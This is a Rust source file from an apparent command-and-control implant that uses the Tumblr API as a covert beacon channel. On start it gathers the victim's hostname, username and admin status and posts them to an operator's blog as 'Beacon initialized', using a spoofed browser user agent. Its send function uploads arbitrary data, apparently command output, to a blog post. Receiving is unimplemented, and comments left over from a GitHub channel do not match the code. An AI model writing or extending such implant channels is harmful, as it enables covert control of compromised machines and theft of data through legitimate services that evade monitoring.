use crate::channels::{Channel, ChannelError};
use serde::{Serialize, Deserialize};
use base64::encode;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, USER_AGENT, ACCEPT};
use serde_json::{json, to_string};
use async_trait::async_trait;
use crate::logger::*;
use whoami::hostname;
use crate::cmd::AgentCommand;
use crate::cmd::getprivs::is_elevated;

/// Base Tumblr API URL
const URL_BASE: &str = "https://api.tumblr.com/v2/";

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TumblrConfig {
    pub blog_id: String,
    pub api_key: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TumblrChannel {
    pub config: TumblrConfig,
    #[serde(skip_serializing, skip_deserializing)]
    pub logger: Logger,
    #[serde(skip_serializing, skip_deserializing)]
    pub client: Client
}

impl TumblrChannel {
    ///
    /// Constructor for [GitHubChannel]
    /// The [GitHubConfig] is coming in serialized because we've defined the types
    /// all the way down. When the full config file is loaded from wherever it's loaded,
    /// this struct will already exist and not need to be parsed here.
    /// 
    async fn _new(config: TumblrConfig, log_level: u64) -> Result<TumblrChannel, ChannelError> {

        let logger = Logger::new(log_level);
        
        let client = TumblrChannel::client()?;
        Ok(TumblrChannel {config, logger, client})

    }

    ///
    /// Generates an ad-hoc client for use with the Tumblr API.
    /// 
    fn client() -> Result<Client, ChannelError> {
        let mut headers = HeaderMap::new();
        
        headers.insert(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36".parse().unwrap());
        headers.insert(ACCEPT, "application/json".parse().unwrap());

        Ok(Client::builder()
            .default_headers(headers)
            .build().unwrap()
        )
    }

}

#[async_trait]
impl Channel for TumblrChannel {
    async fn init(&mut self, log_level: u64) -> Result<String, ChannelError> {
        // Assign logger
        self.logger = Logger::new(log_level);
        self.logger.info(format!("Creating Issue..."));
        // Get hostname
        let mut hn = hostname();

        let is_admin = is_elevated();  

        // Set client correctly
        let client = TumblrChannel::client()?;
        self.client = client;

        self.logger.info(log_out!("Hostname: ", &hn));
        self.logger.debug(format!("Config options: {:?}", self.config));

        // Get username
        let username = whoami::username();
        hn.push_str(" | ");
        hn.push_str(&username);

        self.logger.info(format!("Admin context: {}", is_admin));
        if is_admin {
            hn.push_str("*");
        }

        let url = format!("{}{}/posts", URL_BASE, self.config.blog_id);
        
        // Craft JSON Body
        let body: serde_json::Value = json!({
            "content": [
                {
                    "type": "text",
                    "text": hn,
                    "subtype": "heading1"
                },
                {
                    "type": "text",
                    "text": "Beacon initialized"
                }
            ]
        });

        self.logger.debug(log_out!("Creating Initial Post"));

        let r = self.client
            .post(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        if r.status().is_success() {
            match r.json::<serde_json::Value>().await {
                Ok(_v) => {
                    Ok("".to_string())
                },
                Err(e) => {
                    println!("{e}");
                    self.logger.crit(log_out!("Could not get issue id"));
                    Err(ChannelError { msg: "Could not get issue id".to_string()})
                }
            }

        } else {
            println!("{}", r.text().await.unwrap());
            Err(ChannelError { msg: "Could not get issue id".to_string()})
        }

        // let result_text = r.text().await.unwrap();
        // // Annoying to_string() here because that's a move before the return
        // self.logger.debug(result_text.to_string());
        // Ok(result_text)
    }

    async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError> {
        
        todo!()
        
    }

    async fn send(&self, data: String, post_id: &str) -> Result<String,ChannelError> {
        self.logger.debug(format!("{data}"));

        let blog_id = &self.config.blog_id;
        
        let url = format!("{URL_BASE}{blog_id}/posts/{post_id}");
        
        // Craft JSON Body
        let body: serde_json::Value = json!({
            "content": [
                {
                    "type": "text",
                    "text": "🚀",
                    "subtype": "heading1"
                },
                {
                    "type": "text",
                    "text": data
                }
            ]
        });
        
        let r = self.client
            .put(url)
            .json(&body)
            .send()
            .await
            .unwrap();

        if r.status().is_success() {
            let result_text = r.text().await.unwrap();
            Ok(result_text)
        } else {
            let msg = r.status().as_str().to_owned();
            Err(ChannelError::new(&msg))
        }

    }

    async fn complete(&self, cmd: AgentCommand) -> () {
        self.logger.info(log_out!("No completion necessary for Tumblr; happens on send."));
    }

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    /// 
    fn to_base64(&self) -> String {
        encode(to_string(&self.config).unwrap().as_bytes())
    }

    fn update(&self, _options:String) -> Result<String, ChannelError>  {
        todo!()
    }
}